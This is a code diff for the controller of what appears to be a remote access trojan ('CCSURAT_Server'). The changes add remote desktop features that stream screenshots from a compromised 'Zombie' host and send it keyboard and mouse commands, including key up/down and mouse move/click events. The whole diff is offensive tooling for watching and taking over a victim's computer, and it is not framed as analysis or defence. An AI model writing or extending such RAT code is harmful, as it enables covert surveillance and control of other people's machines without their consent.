@@ -1,19 +1,15 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+using System.Threading;
 using System.Windows.Forms;
-using System.Windows.Input;
 
 namespace CCSURAT_Server
 {
-    public partial class RemoteDesktop : Form
+    public partial class RemoteDesktop  : Form
     {
         private Zombie zombie;
+        private static object screenImageLock = new object();
+        private DateTime lastSentMovement;
 
         public RemoteDesktop(Zombie zombie)
         {
@@ -24,7 +20,7 @@ namespace CCSURAT_Server
 
         private void singleToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            GetScreenImage();
+            GetScreenImage(monitorList.SelectedIndex);
         }
 
         private void RemoteDesktop_Load(object sender, EventArgs e)
@@ -38,7 +34,7 @@ namespace CCSURAT_Server
             refreshTimer.Interval = refreshInterval.Value;
         }
 
-        private void GetScreenImage()
+        private void GetScreenImage(int monitorIndex)
         {
             if (monitorList.Text != string.Empty)
             {
@@ -47,17 +43,26 @@ namespace CCSURAT_Server
                     // Screenshot is made client-side, then transferred to server.
                     // Screenshot binary data is processed and then placed into the client object.
                     MakeScreenshot();
-                    while (zombie.monitors[monitorList.SelectedIndex].getScreenImage() == null)
+
+                    // Attempt to stop frame freezing, works, but the "Single" frame button doesn't
+                    // produce most recent image after running a video "stream".
+                    lock(screenImageLock)
                     {
-                        System.Threading.Thread.Sleep(1);
-                        Application.DoEvents();
+                        new Thread(() =>
+                        {
+                            while (zombie.monitors[monitorIndex].getScreenImage() == null)
+                            {
+                                Thread.Sleep(1);
+                                Application.DoEvents();
+                            }
+                            screenImageBox.Image = zombie.monitors[monitorIndex].getScreenImage();
+                            zombie.monitors[monitorIndex].setScreenImage(null);
+                        }).Start();
                     }
-                    screenImageBox.Image = zombie.monitors[monitorList.SelectedIndex].getScreenImage();
-                    zombie.monitors[monitorList.SelectedIndex].setScreenImage(null);
                 }
                 catch (Exception ex)
                 {
-
+                    Console.WriteLine("Get screen image error: " + ex.ToString());
                 }
             }
         }
@@ -100,6 +105,7 @@ namespace CCSURAT_Server
                 monitorList.Enabled = false;
                 refreshTimer.Start();
             }
+            ActiveControl = screenImageBox;
         }
 
         private void stopToolStripMenuItem_Click(object sender, EventArgs e)
@@ -121,7 +127,7 @@ namespace CCSURAT_Server
 
         private void refreshTimer_Tick(object sender, EventArgs e)
         {
-            GetScreenImage();
+            GetScreenImage(monitorList.SelectedIndex);
         }
 
         private void trackBar1_Scroll(object sender, EventArgs e)
@@ -134,42 +140,91 @@ namespace CCSURAT_Server
             GetMonitors();
         }
 
-        private void pictureBox1_MouseClick(object sender, MouseEventArgs e)
-        {
-
-        }
-
         private void pictureBox1_Click(object sender, EventArgs e)
         {
-            if (mouseControlCheckbox.Checked) {
-                MouseEventArgs mouse = (MouseEventArgs)e;
 
-                // Calculate the screen mouse click point in relation to the picturebox click point.
-                double monitorWidth = zombie.monitors[monitorList.SelectedIndex].getWidth();
-                double monitorHeight = zombie.monitors[monitorList.SelectedIndex].getHeight();
-                double monitorX = zombie.monitors[monitorList.SelectedIndex].getX();
-                double monitorY = zombie.monitors[monitorList.SelectedIndex].getY();
-
-                decimal factorX = (decimal)monitorWidth / screenImageBox.Size.Width;
-                decimal factorY = (decimal)monitorHeight / screenImageBox.Size.Height;
-
-                long clickX = Convert.ToInt64(mouse.X * factorX + (decimal)monitorX);
-                long clickY = Convert.ToInt64(mouse.Y * factorY + (decimal)monitorY);
-
-                // Send click command at X/Y and the mouse button name.
-                zombie.SendData("[[MOUSECLICK]]" + clickX + "|*|" + clickY + "|*|" + mouse.Button.ToString() + "[[/MOUSECLICK]]");
-            }
-        }
-
-        private void RemoteDesktop_KeyPress(object sender, KeyPressEventArgs e)
-        {
         }
 
         private void RemoteDesktop_KeyDown(object sender, KeyEventArgs e)
         {
             if (keyboardControlCheckbox.Checked)
             {
-                zombie.SendData("[[KEYPRESS]]" + e.KeyCode.GetHashCode() + "[[/KEYPRESS]]");
+                zombie.SendData("[[KEYPRESS]]" + e.KeyCode.GetHashCode() + "|*|" + "Down" + "[[/KEYPRESS]]");
+            }
+        }
+
+        private void RemoteDesktop_KeyUp(object sender, KeyEventArgs e)
+        {
+            if (keyboardControlCheckbox.Checked)
+            {
+                zombie.SendData("[[KEYPRESS]]" + e.KeyCode.GetHashCode() + "|*|" + "Up" + "[[/KEYPRESS]]");
+            }
+        }
+
+        private void screenImageBox_MouseMove(object sender, MouseEventArgs e)
+        {
+            if (mouseControlCheckbox.Checked && (lastSentMovement == null || DateTime.Now > lastSentMovement.AddSeconds(1)))
+            {
+                MouseEventArgs mouse = (MouseEventArgs)e;
+
+                Point movePoint = remoteMouseLoc(mouse.X, mouse.Y);
+
+                // Send click command at X/Y and the mouse button name.
+                zombie.SendData("[[MOUSEMOVE]]" + movePoint.X + "|*|" + movePoint.Y + "[[/MOUSEMOVE]]");
+                lastSentMovement = DateTime.Now;
+            }
+        }
+
+        private Point remoteMouseLoc(int x, int y)
+        {
+            // Calculate the screen mouse move point in relation to the picturebox click point.
+            double monitorWidth = zombie.monitors[monitorList.SelectedIndex].getWidth();
+            double monitorHeight = zombie.monitors[monitorList.SelectedIndex].getHeight();
+            double monitorX = zombie.monitors[monitorList.SelectedIndex].getX();
+            double monitorY = zombie.monitors[monitorList.SelectedIndex].getY();
+
+            decimal factorX = (decimal)monitorWidth / screenImageBox.Size.Width;
+            decimal factorY = (decimal)monitorHeight / screenImageBox.Size.Height;
+
+            long mouseX = Convert.ToInt64(x * factorX + (decimal)monitorX);
+            long mouseY = Convert.ToInt64(y * factorY + (decimal)monitorY);
+
+            return new Point((int)mouseX, (int)mouseY);
+        }
+
+        private void mouseControlCheckbox_CheckedChanged(object sender, EventArgs e)
+        {
+            ActiveControl = screenImageBox;
+        }
+
+        private void keyboardControlCheckbox_CheckedChanged(object sender, EventArgs e)
+        {
+            ActiveControl = screenImageBox;
+        }
+
+        private void screenImageBox_MouseDown(object sender, MouseEventArgs e)
+        {
+            if (mouseControlCheckbox.Checked)
+            {
+                MouseEventArgs mouse = (MouseEventArgs)e;
+
+                Point clickPoint = remoteMouseLoc(mouse.X, mouse.Y);
+
+                // Send click command at X/Y and the mouse button name.
+                zombie.SendData("[[MOUSECLICK]]" + clickPoint.X + "|*|" + clickPoint.Y + "|*|" + mouse.Button.ToString() + "|*|" + "Down" + "[[/MOUSECLICK]]");
+            }
+        }
+
+        private void screenImageBox_MouseUp(object sender, MouseEventArgs e)
+        {
+            if (mouseControlCheckbox.Checked)
+            {
+                MouseEventArgs mouse = (MouseEventArgs)e;
+
+                Point clickPoint = remoteMouseLoc(mouse.X, mouse.Y);
+
+                // Send click command at X/Y and the mouse button name.
+                zombie.SendData("[[MOUSECLICK]]" + clickPoint.X + "|*|" + clickPoint.Y + "|*|" + mouse.Button.ToString() + "|*|" + "Up" + "[[/MOUSECLICK]]");
             }
         }
     }
